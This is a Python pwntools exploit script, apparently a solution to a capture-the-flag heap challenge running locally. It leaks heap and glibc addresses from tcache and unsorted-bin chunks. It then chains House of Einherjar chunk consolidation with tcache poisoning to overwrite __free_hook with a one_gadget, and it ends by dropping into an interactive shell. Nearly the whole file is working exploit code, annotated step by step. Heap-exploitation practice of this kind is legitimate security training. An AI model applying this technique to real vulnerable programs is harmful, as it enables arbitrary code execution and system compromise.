from pwn import *

LEAK_SIZE = 0x88

PORT = 5000

TCACHE_SIZE = 7
TCACHE_POISON_CHUNK_SIZE = 0x28
OVERLAPPING_CHUNK_SIZE = 0x258

def allocate(r, buf, size=None):
    if not size:
        size = len(buf)
    r.sendline(b'1')
    r.recvuntil(b'size? ')
    r.sendline(str(size).encode())
    r.recvuntil(b'str? ')
    r.send(buf)
    x = r.recvuntil(b'> ')
    slot = int(x.split(b'!')[0].split(b' ')[2].decode())
    return slot

def tok(r, idx, delim):
    r.sendline(b'2')
    r.recvuntil(b'idx? ')
    r.sendline(str(idx).encode())
    r.recvuntil(b'delim? ')
    r.sendline(delim)
    x = r.recvuntil(b'> ')
    return x.split(b'\n')[0]


def delete(r, idx, prompt=True):
    r.sendline(b'3')
    r.recvuntil(b'idx? ')
    r.sendline(str(idx).encode())
    if prompt:
        r.recvuntil(b'> ')

r = process('./chall')
input('Attach a debugger? ')
# r = remote('127.0.0.1', PORT)

log.info("Leak addresses")

# Allocate chunks for address leak phase.
# We allocate one extra in order to not prevent consolidation with the top of the heap
tcache_slots = []
for _ in range(TCACHE_SIZE):
    tcache_slots.append(allocate(r, b'A' * LEAK_SIZE))

unsorted_bin_slots = []
for _ in range(3):
    unsorted_bin_slots.append(allocate(r, b'B' * LEAK_SIZE))

# Fill tcache
for tcache_slot in tcache_slots:
    delete(r, tcache_slot)

# Put chunks in unsorted bin.
# We need two chunks, otherwise the libc pointers will be zeroed when recycling the single chunk.
delete(r, unsorted_bin_slots[0])
delete(r, unsorted_bin_slots[1])

# Purge tcache. As we do that, we also leak a heap address
tcache_slots = []
for _ in range(TCACHE_SIZE):
    tcache_slots.append(allocate(r, b'C', LEAK_SIZE))

# The tcache chunks contain heap addresses
leak = tok(r, tcache_slots[0], b'\xff')
leak += b'\0' * (8 - len(leak))
leak = u64(leak)
heap = leak - 0x543
assert(heap & 0xfff == 0)
log.info(f"heap @ 0x{heap:x}")

# Now allocate from unsorted bin, which will leak a glibc pointer
unsorted_bin_slot = allocate(r, b'D', LEAK_SIZE)
leak = tok(r, unsorted_bin_slot, b'\xff')
leak += b'\0' * (8 - len(leak))
leak = u64(leak)
libc = leak - 0x3ebd44
assert(libc & 0xfff == 0)
log.info(f"libc @ 0x{libc:x}")
free_hook = libc + 0x3ed8e8
log.info(f"__free_hook @ 0x{free_hook:x}")
one_gadget = libc + 0x4f302
log.info(f"one_gadget @ 0x{one_gadget:x}")

log.info(f"Free up all slots for next phase")
for i in range(16):
    delete(r, i)

log.info("Overwrite __free_hook with one_gadget with house of Einherjar")
# Inspired by https://hackmd.io/@gand3lf/houseofeinherjar
# which in turn is based of https://github.com/shellphish/how2heap/blob/master/glibc_2.31/house_of_einherjar.c
# We are actually targetting glibc 2.27 in this challenge, but the 2.31 version seems to work too.
# Maybe https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_einherjar.c would have been easier.
fake_chunk = p64(0)
fake_chunk += p64(0x60)
fake_chunk += p64(heap + 0x650)
fake_chunk += p64(heap + 0x650)
fake_chunk += b'\0' * (0x38 - len(fake_chunk))
allocate(r, fake_chunk)
slot_B = allocate(r, b'E' * TCACHE_POISON_CHUNK_SIZE)
slot_C = allocate(r, b'F' * 0x1f8) # We can't use 0xf8, because then we'll have 0x0101 on the heap, which won't work with strtok
# Overwrite PREV_INUSE of chunk C
tok(r, slot_B, b'\x01')
# Replace prev_size in chunk B
delete(r, slot_B)
chunk_B = b'G' * 0x20
chunk_B += p64(0x60)
allocate(r, chunk_B)
# Fill up tcache for chunks of size 0x1f8
tcache_slots = []
for _ in range(TCACHE_SIZE):
    tcache_slots.append(allocate(r, b'H' * 0x1f8))
for tcache_slot in tcache_slots:
    delete(r, tcache_slot)
# Trigger consolidation and allocate bogus chunk
delete(r, slot_C)
overlapping_slot = allocate(r, b'I', OVERLAPPING_CHUNK_SIZE)
# Put a chunk in tcache bin of size 0x28
slot = allocate(r, b'J' * TCACHE_POISON_CHUNK_SIZE)
delete(r, slot)
# Free chunk B to add it to the tcache bin
delete(r, slot_B)
# Now we overwrite chunk_B forward's pointer
delete(r, overlapping_slot)
tcache_poison_chunk = b'K' * TCACHE_POISON_CHUNK_SIZE 
tcache_poison_chunk += p64((TCACHE_POISON_CHUNK_SIZE + 8) | 1)
tcache_poison_chunk += p64(free_hook)
allocate(r, tcache_poison_chunk, OVERLAPPING_CHUNK_SIZE)
# Allocate twice from tcache to get a chunk at __free_hook
allocate(r, b'L' * TCACHE_POISON_CHUNK_SIZE)
allocate(r, p64(one_gadget), TCACHE_POISON_CHUNK_SIZE)

log.info("Trigger __free_hook")
delete(r, 0, prompt=False)

r.interactive()
